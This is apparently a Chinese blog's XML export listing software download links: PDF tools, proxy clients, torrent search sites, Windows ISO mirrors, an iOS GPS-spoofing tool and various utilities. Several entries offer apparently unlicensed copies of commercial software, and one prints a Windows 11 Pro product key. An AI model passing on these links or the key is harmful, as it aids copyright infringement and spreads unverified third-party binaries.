<h1 id="重新安装-macOS"><a href="#重新安装-macOS" class="headerlink" title="重新安装 macOS"></a>重新安装 macOS</h1><p>回到实用工具界面之后（下图），在实用工具窗口中选择“重新安装 macOS”，然后点按“继续”并按照屏幕上提示的操作一路默认继续开始操作安装。<br><img src="/img/mac/5.webp" alt="macos-big-sur-recovery-reinstall-macos"><br>系统开始安装之后等待即可，安装过程系统会重启-3-5次的，直到进入欢迎界面就表示安装完成了，简单设置就可以进入系统桌面使用了。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>windows版 pdf 阅读器</title>
    <url>/posts/f48a46e9/</url>
    <content><![CDATA[<h1 id="万兴PDF"><a href="#万兴PDF" class="headerlink" title="万兴PDF"></a>万兴PDF</h1><p>链接: <a href="https://pan.baidu.com/s/1TXAW3D-28zgxq9BQxetesw?pwd=he84">https://pan.baidu.com/s/1TXAW3D-28zgxq9BQxetesw?pwd=he84</a> 提取码: he84 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="福昕PDF"><a href="#福昕PDF" class="headerlink" title="福昕PDF"></a>福昕PDF</h1><p>链接: <a href="https://pan.baidu.com/s/1dw513-K5gF3cRY_XO5ZZNA?pwd=bj15">https://pan.baidu.com/s/1dw513-K5gF3cRY_XO5ZZNA?pwd=bj15</a> 提取码: bj15 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="小巧PDF阅读器"><a href="#小巧PDF阅读器" class="headerlink" title="小巧PDF阅读器"></a>小巧PDF阅读器</h1><p><a href="https://www.sumatrapdfreader.org/download-free-pdf-viewer">https://www.sumatrapdfreader.org/download-free-pdf-viewer</a></p>
<h1 id="PDF编辑器：adobe-acrobat-X-pro"><a href="#PDF编辑器：adobe-acrobat-X-pro" class="headerlink" title="PDF编辑器：adobe acrobat X pro"></a>PDF编辑器：adobe acrobat X pro</h1><p>链接: <a href="https://pan.baidu.com/s/1HQOGoqA00IFPXvz10imvgA?pwd=xqyz">https://pan.baidu.com/s/1HQOGoqA00IFPXvz10imvgA?pwd=xqyz</a> 提取码: xqyz 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<p>TinyWow：免费 PDF、视频、图像和其他在线工具<br><a href="https://tinywow.com/">https://tinywow.com/</a></p>
<p>PDF Fixer：<br><a href="https://pdffixer.com/index.html">https://pdffixer.com/index.html</a></p>
<p>在线PDF工具合集</p>
<p>链接：<a href="http://remeins.com/">http://remeins.com</a><br>链接：<a href="https://www.pdf2go.com/zh">https://www.pdf2go.com/zh</a><br>链接：<a href="https://lightpdf.com/">https://lightpdf.com</a><br>链接：<a href="https://tools.pdf24.org/zh">https://tools.pdf24.org/zh</a><br>链接：<a href="https://www.pdfpai.com/">https://www.pdfpai.com</a><br>链接：<a href="https://www.xpdf.cn/">https://www.xpdf.cn</a></p>
<p>免费PDF在线工具地址<br>记灵工具：<a href="http://remeins.com/">http://remeins.com/</a></p>
]]></content>
      <categories>
        <category>toools</category>
        <category>pdf</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>pdf</tag>
      </tags>
  </entry>
  <entry>
    <title>代理上网客户端（macos，android，windows）</title>
    <url>/posts/63b0a4c1/</url>
    <content><![CDATA[<h1 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h1><h2 id="ClashX-1-91-1-dmg"><a href="#ClashX-1-91-1-dmg" class="headerlink" title="ClashX-1.91.1.dmg"></a>ClashX-1.91.1.dmg</h2><p><a href="https://wwm.lanzouw.com/i835c0e45wxe">https://wwm.lanzouw.com/i835c0e45wxe</a> 密码:gx7b<br><a href="https://github.com/yichengchen/clashX/releases">https://github.com/yichengchen/clashX/releases</a></p>
<h2 id="Trojan-Qt5-macOS-1-1-6-dmg"><a href="#Trojan-Qt5-macOS-1-1-6-dmg" class="headerlink" title="Trojan-Qt5-macOS.1.1.6.dmg"></a>Trojan-Qt5-macOS.1.1.6.dmg</h2><p><a href="https://wwm.lanzouw.com/imPZ20e45z5e">https://wwm.lanzouw.com/imPZ20e45z5e</a> 密码:hbrd</p>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="ClashForAndroid"><a href="#ClashForAndroid" class="headerlink" title="ClashForAndroid"></a>ClashForAndroid</h2><p><a href="https://github.com/Kr328/ClashForAndroid/releases">https://github.com/Kr328/ClashForAndroid/releases</a></p>
<h2 id="clash-for-android-2-4-9-apk"><a href="#clash-for-android-2-4-9-apk" class="headerlink" title="clash-for-android-2.4.9.apk"></a>clash-for-android-2.4.9.apk</h2><p><a href="https://wwsf.lanzouw.com/i8nJF09dn6mj">https://wwsf.lanzouw.com/i8nJF09dn6mj</a> 密码:gz1s</p>
<h2 id="v2rayNG"><a href="#v2rayNG" class="headerlink" title="v2rayNG"></a>v2rayNG</h2><p><a href="https://github.com/2dust/v2rayNG/releases">https://github.com/2dust/v2rayNG/releases</a></p>
<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="v2rayN-Core"><a href="#v2rayN-Core" class="headerlink" title="v2rayN-Core"></a>v2rayN-Core</h2><h3 id="v2rayN-V6-21"><a href="#v2rayN-V6-21" class="headerlink" title="v2rayN V6.21"></a>v2rayN V6.21</h3><p><a href="https://wwsf.lanzouw.com/isNCg0uf1xyj">https://wwsf.lanzouw.com/isNCg0uf1xyj</a><br>密码:fuhu<br><a href="https://github.com/2dust/v2rayN/releases">https://github.com/2dust/v2rayN/releases</a><br>以管理员身份运行，启用Tun模式，设置——参数设置——Tun模式设置——关闭显示控制台</p>
<h2 id="Clash-for-Windows-Setup-0-19-20-exe"><a href="#Clash-for-Windows-Setup-0-19-20-exe" class="headerlink" title="Clash.for.Windows.Setup.0.19.20.exe"></a>Clash.for.Windows.Setup.0.19.20.exe</h2><p><a href="https://wwm.lanzouw.com/ibTwI0e466md">https://wwm.lanzouw.com/ibTwI0e466md</a> 密码:fjkc<br>GitHub<br><a href="https://github.com/Fndroid/clash_for_windows_pkg/releases">https://github.com/Fndroid/clash_for_windows_pkg/releases</a><br>汉化补丁<br><a href="https://github.com/BoyceLig/Clash_Chinese_Patch/releases/">https://github.com/BoyceLig/Clash_Chinese_Patch/releases/</a></p>
<h2 id="Trojan-Qt5-Windows-1-1-6-7z"><a href="#Trojan-Qt5-Windows-1-1-6-7z" class="headerlink" title="Trojan-Qt5-Windows.1.1.6.7z"></a>Trojan-Qt5-Windows.1.1.6.7z</h2><p><a href="https://wwm.lanzouw.com/ic1P40e467he">https://wwm.lanzouw.com/ic1P40e467he</a> 密码:4a0j</p>
]]></content>
      <categories>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索网盘资源，种子，磁力链接</title>
    <url>/posts/bb927633/</url>
    <content><![CDATA[<h1 id="云盘畅搜-https-wwm-lanzouw-com-ia1BB0e9kqje-密码-2n48"><a href="#云盘畅搜-https-wwm-lanzouw-com-ia1BB0e9kqje-密码-2n48" class="headerlink" title="云盘畅搜 https://wwm.lanzouw.com/ia1BB0e9kqje 密码:2n48"></a>云盘畅搜 <a href="https://wwm.lanzouw.com/ia1BB0e9kqje">https://wwm.lanzouw.com/ia1BB0e9kqje</a> 密码:2n48</h1><h1 id="吴签磁力-https-wuqianai-top"><a href="#吴签磁力-https-wuqianai-top" class="headerlink" title="吴签磁力 https://wuqianai.top/"></a>吴签磁力 <a href="https://wuqianai.top/">https://wuqianai.top/</a></h1><h1 id="种子磁力在线播放和下载工具地址-Webtor-https-webtor-io"><a href="#种子磁力在线播放和下载工具地址-Webtor-https-webtor-io" class="headerlink" title="种子磁力在线播放和下载工具地址 Webtor https://webtor.io/"></a>种子磁力在线播放和下载工具地址 Webtor <a href="https://webtor.io/">https://webtor.io/</a></h1><h1 id="Magnetar-磁星搜索-https-magnetar1-pw-地址发布页-https-cixing-pw"><a href="#Magnetar-磁星搜索-https-magnetar1-pw-地址发布页-https-cixing-pw" class="headerlink" title="Magnetar&#x2F;磁星搜索 https://magnetar1.pw/ 地址发布页 https://cixing.pw/"></a>Magnetar&#x2F;磁星搜索 <a href="https://magnetar1.pw/">https://magnetar1.pw/</a> 地址发布页 <a href="https://cixing.pw/">https://cixing.pw/</a></h1><h1 id="皮皮鸭部落-https-pipiduck-com"><a href="#皮皮鸭部落-https-pipiduck-com" class="headerlink" title="皮皮鸭部落 https://pipiduck.com/"></a>皮皮鸭部落 <a href="https://pipiduck.com/">https://pipiduck.com/</a></h1><h1 id="sharemore52-https-sharemore52-gitee-io"><a href="#sharemore52-https-sharemore52-gitee-io" class="headerlink" title="sharemore52 https://sharemore52.gitee.io/"></a>sharemore52 <a href="https://sharemore52.gitee.io/">https://sharemore52.gitee.io/</a></h1><h1 id="网站地址：https-wuji-me-发布页：https-cili-st"><a href="#网站地址：https-wuji-me-发布页：https-cili-st" class="headerlink" title="网站地址：https://wuji.me/ 发布页：https://cili.st/"></a>网站地址：<a href="https://wuji.me/">https://wuji.me/</a> 发布页：<a href="https://cili.st/">https://cili.st/</a></h1><h1 id="BT之家-https-btbtt18-com"><a href="#BT之家-https-btbtt18-com" class="headerlink" title="BT之家 https://btbtt18.com/"></a>BT之家 <a href="https://btbtt18.com/">https://btbtt18.com/</a></h1>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统原版镜像站</title>
    <url>/posts/a269b44b/</url>
    <content><![CDATA[<h1 id="MSDN-我告诉你-https-msdn-itellyou-cn"><a href="#MSDN-我告诉你-https-msdn-itellyou-cn" class="headerlink" title="MSDN, 我告诉你 https://msdn.itellyou.cn/"></a>MSDN, 我告诉你 <a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></h1><h1 id="next-我告诉你-https-next-itellyou-cn"><a href="#next-我告诉你-https-next-itellyou-cn" class="headerlink" title="next, 我告诉你 https://next.itellyou.cn/"></a>next, 我告诉你 <a href="https://next.itellyou.cn/">https://next.itellyou.cn/</a></h1><h1 id="HelloWindows-精校-完整-极致-https-hellowindows-cn"><a href="#HelloWindows-精校-完整-极致-https-hellowindows-cn" class="headerlink" title="HelloWindows 精校 完整 极致 https://hellowindows.cn/"></a>HelloWindows 精校 完整 极致 <a href="https://hellowindows.cn/">https://hellowindows.cn/</a></h1><h1 id="MSDN-–-山己几子木-https-msdn-sjjzm-com"><a href="#MSDN-–-山己几子木-https-msdn-sjjzm-com" class="headerlink" title="MSDN – 山己几子木 https://msdn.sjjzm.com/"></a>MSDN – 山己几子木 <a href="https://msdn.sjjzm.com/">https://msdn.sjjzm.com/</a></h1><h1 id="TechBench-by-WZT-v4-1-1-https-tb-rg-adguard-net-public-php"><a href="#TechBench-by-WZT-v4-1-1-https-tb-rg-adguard-net-public-php" class="headerlink" title="TechBench by WZT (v4.1.1) https://tb.rg-adguard.net/public.php"></a>TechBench by WZT (v4.1.1) <a href="https://tb.rg-adguard.net/public.php">https://tb.rg-adguard.net/public.php</a></h1><p>Windows 11专业版产品密钥<br>TW9DD-83NPF-XDWHW-TWQD2-V8RB3</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>牛蛙助手</title>
    <url>/posts/4b934d82/</url>
    <content><![CDATA[<p>牛蛙助手是一款专业的ios移动端必备的工具，牛蛙助手免费为苹果用户提供：ios移动端免越狱使用apple id签名，ios移动端免越狱全局修改gps定位信息，<br>iOS虚拟定位工具<br>IPA签名工具<br>iOS打开开开发者模式步骤<br>打开设置-隐私于安全-开发者模式（打开开发者模式），手机上没有开发者模式的，连接电脑进入爱思助手虚拟定位一下，开发者模式就出来，然后进入牛蛙就能正常使用了 </p>
<h1 id="牛蛙助手下载地址：http-ios222-com"><a href="#牛蛙助手下载地址：http-ios222-com" class="headerlink" title="牛蛙助手下载地址：http://ios222.com/"></a>牛蛙助手下载地址：<a href="http://ios222.com/">http://ios222.com/</a></h1><h1 id="爱思助手下载地址：https-www-i4-cn"><a href="#爱思助手下载地址：https-www-i4-cn" class="headerlink" title="爱思助手下载地址：https://www.i4.cn/"></a>爱思助手下载地址：<a href="https://www.i4.cn/">https://www.i4.cn/</a></h1><h1 id="安装教程：http-ios222-com-anzhuang-html"><a href="#安装教程：http-ios222-com-anzhuang-html" class="headerlink" title="安装教程：http://ios222.com/anzhuang.html"></a>安装教程：<a href="http://ios222.com/anzhuang.html">http://ios222.com/anzhuang.html</a></h1><h1 id="虚拟定位使用教程：http-ios222-com-dingwei-html"><a href="#虚拟定位使用教程：http-ios222-com-dingwei-html" class="headerlink" title="虚拟定位使用教程：http://ios222.com/dingwei.html"></a>虚拟定位使用教程：<a href="http://ios222.com/dingwei.html">http://ios222.com/dingwei.html</a></h1><h1 id="ipa签名使用教程：http-ios222-com-qianming-html"><a href="#ipa签名使用教程：http-ios222-com-qianming-html" class="headerlink" title="ipa签名使用教程：http://ios222.com/qianming.html"></a>ipa签名使用教程：<a href="http://ios222.com/qianming.html">http://ios222.com/qianming.html</a></h1>]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>clashx for mac 教程</title>
    <url>/posts/cfc730b7/</url>
    <content><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h1><p>Clash 是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。<br>ClashX 是运行在 macOS 上的一款科学上网工具。<br>Github 地址：<a href="https://github.com/yichengchen/clashX/releases">https://github.com/yichengchen/clashX/releases</a><br>系统要求：macOS 10.5 及以上<br>设备要求：MacBook &#x2F;iMac&#x2F; Mac Pro<br>支持的协议： Vmess, Shadowsocks, Snell , SOCKS5<br>特色：<br>可随时切换代理模式及节点<br>支持节点批量延迟测试<br>通过托管链接一键配置<br>规则命中分析<br>日志输出</p>
<h1 id="2-下载安装"><a href="#2-下载安装" class="headerlink" title="2. 下载安装"></a>2. 下载安装</h1><p>⭐Github 地址👉 <a href="https://github.com/yichengchen/clashX/releases">https://github.com/yichengchen/clashX/releases</a></p>
<h1 id="3-快速上手"><a href="#3-快速上手" class="headerlink" title="3. 快速上手"></a>3. 快速上手</h1><p>请打开 ClashX 软件。<br>首次使用 ClashX 时，macOS 会提醒你此应用来自未知开发者，请允许打开此应用。<br>ClashX 首次运行会提示是否安装帮助程序（Helper）。此帮助程序用于设置系统代理，否则每次你通过 ClashX 变更系统系统状态（打开或关闭）时都需要输入密码，请点击 “Install”，之后 macOS 会提示输入用户密码。<br><img src="/img/clashformac1/1.webp" alt="3079236644"><br>启动 ClashX，点击状态栏中的 ClashX 图标，依次选择「配置」、「托管配置」、「管理」，在弹出的界面点击添加订阅。<br><img src="/img/clashformac1/2.webp" alt="1860530914"><br><img src="/img/clashformac1/3.webp" alt="4091364052"><br><img src="/img/clashformac1/4.webp" alt="974690266"><br>若干秒后将在软件里看到刚刚添加的配置文件。<br><img src="/img/clashformac1/5.webp" alt="2281085310"><br>点击 ClashX 状态栏图标，将「出站模式」选为「规则判断」，在「Proxy」或「Gloabal」策略组中可以选择自己喜欢的线路，然后点击「设置为系统代理」即可开始使用。<br>「Proxy」或「Gloabal」策略组是用于访问国际互联网的默认策略，一般情况下，所有国际网络的访问都通过该策略组中选择的节点进行连接。<br><img src="/img/clashformac1/6.webp" alt="1813241339"><br><img src="/img/clashformac1/7.webp" alt="142645459"><br><img src="/img/clashformac1/8.webp" alt="1214799673"><br>此时您已可以自由地连接国际互联网。</p>
<h1 id="4-更多"><a href="#4-更多" class="headerlink" title="4. 更多"></a>4. 更多</h1><p>对于策略组的简单解释：</p>
<h2 id="4-1-策略组的特性："><a href="#4-1-策略组的特性：" class="headerlink" title="4.1 策略组的特性："></a>4.1 策略组的特性：</h2><p>可以包含节点或其他策略组<br>具有多种不同的策略类型<br>服务于规则</p>
<h2 id="4-2-不同策略组的作用："><a href="#4-2-不同策略组的作用：" class="headerlink" title="4.2 不同策略组的作用："></a>4.2 不同策略组的作用：</h2><p>Global (或 Proxy，视配置文件具体情况而定)：主要规则代理分组，需手动选定一个你要使用的节点作为默认的节点。无其它修改的话，所有国际网络的访问都通过该策略组中选择的节点进行连接。<br>Netflix：指 Netflix 流媒体的分组，如选择香港节点，则显示港区内容。其它地区的同理。<br>Spotify：指 Spotify 流媒体的分组，仅用于加速访问。Spotify 执行锁区政策，根据账号注册时所在地进行内容展示，更换节点并不能显示其它地区的版权内容。<br>YouTube：指 YouTube 流媒体的分组，使用不同的线路将展示不同地区的特色内容。<br>Telegram：指 Telegram（电报）的分组，国内手机号注册的用户选择新加坡线路也许可以加速（注意：是也许。因为 + 86 号段注册的电报用户数据都在新加坡数据中心）。<br>China：访问中国大陆网站所用的策略。大陆用户请选择 DIRECT （直接连接）；海外用户请选择回国线路。<br>Auto：软件每隔一段时间会自动进行测试并排序，自动评选出延迟最低的节点，当其它策略组里选择了 auto 策略，那么效果就是该策略组将每隔一段时间自动切换到延迟最低的线路。<br>（如果你有登陆脸书、IG 等社交媒体，不建议使用该策略，以免由于 IP 变动造成风控，甚至封号。）<br>fallback：可用性策略。与故障转移类似，按照节点顺序选择第一个可用节点。</p>
<h1 id="5-常见订阅错误报告"><a href="#5-常见订阅错误报告" class="headerlink" title="5. 常见订阅错误报告"></a>5. 常见订阅错误报告</h1><p>① 如果遇到以下提示：<br>Invalid Config:yaml:<br>unmarshal errors:line 1:cannot unmarshal !!str c3M6Ly9…<br>说明用错了订阅链接，请检查自己是不是复制错了或者多了空格之类的。<br>没有 Clash 订阅链接的可以使用订阅转换 API 来转换订阅链接。<br>② 如果遇到此类提示：<br>Invalid Config:<br>Value for ‘Proxy’ is invalid:Unexpected null or empty<br>说明你还没买套餐，或者订阅为空。请联系你所在机场的管理员。<br>③ 如果遇到此提示：<br>…cipher not supported<br>说明你使用的加密算法不被 Clash 支持。请更换加密算法。推荐：ChaCha20-ietf-poly1305</p>
<h1 id="6-Clash-家族"><a href="#6-Clash-家族" class="headerlink" title="6. Clash 家族"></a>6. Clash 家族</h1><p>Clash for Android <a href="https://github.com/Kr328/ClashForAndroid/releases">https://github.com/Kr328/ClashForAndroid/releases</a><br>Clash for Windows <a href="https://github.com/Fndroid/clash_for_windows_pkg/releases">https://github.com/Fndroid/clash_for_windows_pkg/releases</a><br>ClashX <a href="https://github.com/yichengchen/clashX/releases">https://github.com/yichengchen/clashX/releases</a><br>Clash Core <a href="https://github.com/Dreamacro/clash/releases">https://github.com/Dreamacro/clash/releases</a></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>clash</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>macos + clashx 设置tg代理教程</title>
    <url>/posts/9014f6a3/</url>
    <content><![CDATA[<h1 id="环境以及准备"><a href="#环境以及准备" class="headerlink" title="环境以及准备"></a>环境以及准备</h1><p>MacBook 或iMac<br>Clash X for MacOS（已开启）<br>代理节点（可用）<br>已注册的telegram账号</p>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>由于Mac桌面版Telegram需要全局代理才可以登录，不想设置全局代理的小伙伴可以在登录之前设置本地代理进行登录。</p>
<h2 id="1-点击Mac状态栏Clash-X的小猫图标，选中Dashboard"><a href="#1-点击Mac状态栏Clash-X的小猫图标，选中Dashboard" class="headerlink" title="1.点击Mac状态栏Clash X的小猫图标，选中Dashboard"></a>1.点击Mac状态栏Clash X的小猫图标，选中Dashboard</h2><p><img src="/img/clashformac/1.webp" alt="1-210H2123303563"></p>
<h2 id="2-点击设置"><a href="#2-点击设置" class="headerlink" title="2.点击设置"></a>2.点击设置</h2><p><img src="/img/clashformac/2.webp" alt="1-210H2123330c2"></p>
<h2 id="3-记下混合代理端口号，本例为7890"><a href="#3-记下混合代理端口号，本例为7890" class="headerlink" title="3.记下混合代理端口号，本例为7890"></a>3.记下混合代理端口号，本例为7890</h2><p><img src="/img/clashformac/3.webp" alt="1-210H2123421321"></p>
<h2 id="4-打开telegram并点击右上角代理图标-如果已经登录的用户，请去-“设置-高级-连接方式”-英文版-“Setting-Advanced-Connection-Type”"><a href="#4-打开telegram并点击右上角代理图标-如果已经登录的用户，请去-“设置-高级-连接方式”-英文版-“Setting-Advanced-Connection-Type”" class="headerlink" title="4.打开telegram并点击右上角代理图标(如果已经登录的用户，请去  “设置-&gt;高级-&gt;连接方式”  英文版 “Setting-&gt;Advanced-&gt;Connection Type”)"></a>4.打开telegram并点击右上角代理图标(如果已经登录的用户，请去  “设置-&gt;高级-&gt;连接方式”  英文版 “Setting-&gt;Advanced-&gt;Connection Type”)</h2><p><img src="/img/clashformac/4.webp" alt="1-210H2123440P4"></p>
<h2 id="5-点击“添加代理“"><a href="#5-点击“添加代理“" class="headerlink" title="5.点击“添加代理“"></a>5.点击“添加代理“</h2><p><img src="/img/clashformac/5.webp" alt="1-210H212362V49"></p>
<h2 id="6-选择“SOCKS5“"><a href="#6-选择“SOCKS5“" class="headerlink" title="6.选择“SOCKS5“"></a>6.选择“SOCKS5“</h2><p><img src="/img/clashformac/6.webp" alt="1-210H2123A4518"></p>
<h2 id="7-在服务器中输入“127-0-0-1“，端口输入刚才从ClashX得到的端口号“7890“（该端口号为本案例端口，请结合自己的实际情况填写），并点击右上角的“完成“，即可开始使用代理登录你的Telegram账号。"><a href="#7-在服务器中输入“127-0-0-1“，端口输入刚才从ClashX得到的端口号“7890“（该端口号为本案例端口，请结合自己的实际情况填写），并点击右上角的“完成“，即可开始使用代理登录你的Telegram账号。" class="headerlink" title="7.在服务器中输入“127.0.0.1“，端口输入刚才从ClashX得到的端口号“7890“（该端口号为本案例端口，请结合自己的实际情况填写），并点击右上角的“完成“，即可开始使用代理登录你的Telegram账号。"></a>7.在服务器中输入“127.0.0.1“，端口输入刚才从ClashX得到的端口号“7890“（该端口号为本案例端口，请结合自己的实际情况填写），并点击右上角的“完成“，即可开始使用代理登录你的Telegram账号。</h2><p><img src="/img/clashformac/7.webp" alt="1-210H2123H0442"></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>clash</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>对比文本、文件、文件夹，还可以对比pdf、zip、二进制等等工具</title>
    <url>/posts/abea8b06/</url>
    <content><![CDATA[<h1 id="Beyond-Compare文件比较工具-v4-4-3-汉化版"><a href="#Beyond-Compare文件比较工具-v4-4-3-汉化版" class="headerlink" title="Beyond Compare文件比较工具_v4.4.3 汉化版"></a>Beyond Compare文件比较工具_v4.4.3 汉化版</h1><p>比较文件夹、文本、Excel表格<br> <a href="https://wwm.lanzouw.com/igv7r0f2jbve">https://wwm.lanzouw.com/igv7r0f2jbve</a> 密码:33jy</p>
<h1 id="UltraCompare"><a href="#UltraCompare" class="headerlink" title="UltraCompare"></a>UltraCompare</h1><p>对比文本、文件、文件夹，还可以对比PDF、ZIP、二进制等等<br> <a href="https://wwm.lanzouw.com/io7Nv0f2jdwh">https://wwm.lanzouw.com/io7Nv0f2jdwh</a> 密码:7sii</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>进程查看管理软件和查找路径地址</title>
    <url>/posts/99fa007d/</url>
    <content><![CDATA[<p>Process Explorerv16.32<br><a href="https://wwm.lanzouw.com/iFEte0ftljrc">https://wwm.lanzouw.com/iFEte0ftljrc</a> 密码:2ipi</p>
<p>获取窗口信息<br><a href="https://wwm.lanzouw.com/i9zgx0ftlq6d">https://wwm.lanzouw.com/i9zgx0ftlq6d</a> 密码:dxx8</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>文档批量转换格式，重命名，拼接；文件查看器；图片编辑</title>
    <url>/posts/85b8df8d/</url>
    <content><![CDATA[<h1 id="拼图工具"><a href="#拼图工具" class="headerlink" title="拼图工具"></a>拼图工具</h1><p>PicMerger<br><a href="https://wwm.lanzouw.com/idM2S0fyy3wj">https://wwm.lanzouw.com/idM2S0fyy3wj</a> 密码:ha7f</p>
<h1 id="批量重命名"><a href="#批量重命名" class="headerlink" title="批量重命名"></a>批量重命名</h1><p>FastStone Photo Resizer 4.3<br><a href="https://wwm.lanzouw.com/i56IY0fyykwb">https://wwm.lanzouw.com/i56IY0fyykwb</a> 密码:543r</p>
<h1 id="格式转换"><a href="#格式转换" class="headerlink" title="格式转换"></a>格式转换</h1><p>FileConverter-1.2.3<br><a href="https://wwm.lanzouw.com/iQN090fyym6h">https://wwm.lanzouw.com/iQN090fyym6h</a> 密码:3j65</p>
<h1 id="滚动截图长截图录屏"><a href="#滚动截图长截图录屏" class="headerlink" title="滚动截图长截图录屏"></a>滚动截图长截图录屏</h1><p>屏幕滚动截图长图录屏工具-FSCapture企业版-FastStone Capture9.7（单）<br><a href="https://wwm.lanzouw.com/ijjsX0fyz5mh">https://wwm.lanzouw.com/ijjsX0fyz5mh</a> 密码:4rum</p>
<h1 id="多格式文件查看器"><a href="#多格式文件查看器" class="headerlink" title="多格式文件查看器"></a>多格式文件查看器</h1><h2 id="万能文件查看器Universal-Viewer"><a href="#万能文件查看器Universal-Viewer" class="headerlink" title="万能文件查看器Universal Viewer"></a>万能文件查看器Universal Viewer</h2><p><a href="https://wwm.lanzouw.com/irsSD0fyzwqd">https://wwm.lanzouw.com/irsSD0fyzwqd</a> 密码:9n2v</p>
<h2 id="fileviewpro-中文版"><a href="#fileviewpro-中文版" class="headerlink" title="fileviewpro 中文版"></a>fileviewpro 中文版</h2><p><a href="https://wwm.lanzouw.com/iYLYe0fz0y2h">https://wwm.lanzouw.com/iYLYe0fz0y2h</a> 密码:381w</p>
<h1 id="图片编辑，调整大小，压缩图片"><a href="#图片编辑，调整大小，压缩图片" class="headerlink" title="图片编辑，调整大小，压缩图片"></a>图片编辑，调整大小，压缩图片</h1><p>FastStone Image Viewer 7.6<br><a href="https://wwm.lanzouw.com/iNYNH0fz0bzc">https://wwm.lanzouw.com/iNYNH0fz0bzc</a> 密码:519q</p>
<h1 id="Acrobat-DC-2022-012-20085"><a href="#Acrobat-DC-2022-012-20085" class="headerlink" title="Acrobat DC 2022.012.20085"></a>Acrobat DC 2022.012.20085</h1><p>链接: <a href="https://pan.baidu.com/s/1nhgomKzzRrWXoxv4T7vaRA?pwd=y5yd">https://pan.baidu.com/s/1nhgomKzzRrWXoxv4T7vaRA?pwd=y5yd</a> 提取码: y5yd 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="批量复制粘贴工具0-4"><a href="#批量复制粘贴工具0-4" class="headerlink" title="批量复制粘贴工具0.4"></a>批量复制粘贴工具0.4</h1><p><a href="https://wwm.lanzouw.com/iWJUd0fz3bvg">https://wwm.lanzouw.com/iWJUd0fz3bvg</a> 密码:5j3h</p>
<h1 id="PowerToysSetup-0-48-1-x64"><a href="#PowerToysSetup-0-48-1-x64" class="headerlink" title="PowerToysSetup-0.48.1-x64"></a>PowerToysSetup-0.48.1-x64</h1><p>唤醒、颜色选择器、FancyZones、文件资源管理器加载项、图片大小调整器、键盘管理器、PowerRename、PowerToys Run<br><a href="https://wwm.lanzouw.com/iutLP0fz45xi">https://wwm.lanzouw.com/iutLP0fz45xi</a> 密码:gc81</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>洛雪音乐助手全网付费歌曲版权音乐免费听下载</title>
    <url>/posts/fb6f734a/</url>
    <content><![CDATA[<h1 id="PC版"><a href="#PC版" class="headerlink" title="PC版"></a>PC版</h1><h2 id="安装版-lx-music-desktop-v1-22-3"><a href="#安装版-lx-music-desktop-v1-22-3" class="headerlink" title="安装版 lx-music-desktop-v1.22.3"></a>安装版 lx-music-desktop-v1.22.3</h2><p><a href="https://wwm.lanzouw.com/iy0Wp0h6qsib">https://wwm.lanzouw.com/iy0Wp0h6qsib</a> 密码:7h01</p>
<h2 id="绿化版-lx-music-desktop-v1-22-3-win-x64-green"><a href="#绿化版-lx-music-desktop-v1-22-3-win-x64-green" class="headerlink" title="绿化版 lx-music-desktop-v1.22.3-win_x64-green"></a>绿化版 lx-music-desktop-v1.22.3-win_x64-green</h2><p><a href="https://wwm.lanzouw.com/iRjZJ0h6rg0h">https://wwm.lanzouw.com/iRjZJ0h6rg0h</a> 密码:gb4w</p>
<h2 id="MusicTools-v1-9-7-9-7"><a href="#MusicTools-v1-9-7-9-7" class="headerlink" title="MusicTools v1.9.7.9.7"></a>MusicTools v1.9.7.9.7</h2><p><a href="https://wwm.lanzouw.com/iz9yp0h6tq3c">https://wwm.lanzouw.com/iz9yp0h6tq3c</a> 密码:7xp5</p>
<h1 id="macOS版"><a href="#macOS版" class="headerlink" title="macOS版"></a>macOS版</h1><h2 id="lx-music-desktop-1-22-3-dmg"><a href="#lx-music-desktop-1-22-3-dmg" class="headerlink" title="lx-music-desktop-1.22.3.dmg"></a>lx-music-desktop-1.22.3.dmg</h2><p><a href="https://wwm.lanzouw.com/iuJvW0h6rjqb">https://wwm.lanzouw.com/iuJvW0h6rjqb</a> 密码:8csu</p>
